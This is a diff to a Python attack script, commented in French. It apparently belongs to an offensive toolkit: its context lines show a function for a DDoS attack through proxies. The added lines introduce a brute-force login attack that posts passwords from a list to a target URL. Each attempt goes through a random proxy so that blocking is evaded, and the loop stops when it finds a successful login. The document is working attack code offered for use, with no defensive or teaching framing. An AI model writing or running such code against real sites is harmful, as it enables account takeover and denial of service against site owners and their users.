@@ -124,3 +124,19 @@ def ddos_attack_with_proxies(url):
             time.sleep(0.1)  # Petit délai entre chaque requête pour éviter une surcharge immédiate
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors de l'attaque DDoS : {e}", "red"))
+
+# Nouvelle fonction ajoutée pour l'attaque par force brute avec des proxies
+def bruteforce_attack_with_proxies(url, username, password_list):
+    print(colored("[*] Lancement de l'attaque par force brute avec des proxies...", "yellow"))
+    for password in password_list:
+        proxy = get_random_proxy()
+        print(f"[+] Tentative avec le proxy : {proxy} et mot de passe : {password}")
+        try:
+            response = requests.post(url, data={"username": username, "password": password}, proxies={"http": proxy, "https": proxy}, timeout=10)
+            if "Login successful" in response.text:
+                print(colored(f"[+] Attaque réussie avec le mot de passe : {password}", "green"))
+                break
+            else:
+                print(f"[-] Tentative échouée avec le mot de passe : {password}")
+        except requests.exceptions.RequestException as e:
+            print(colored(f"[!] Erreur lors de l'attaque brute : {e}", "red"))
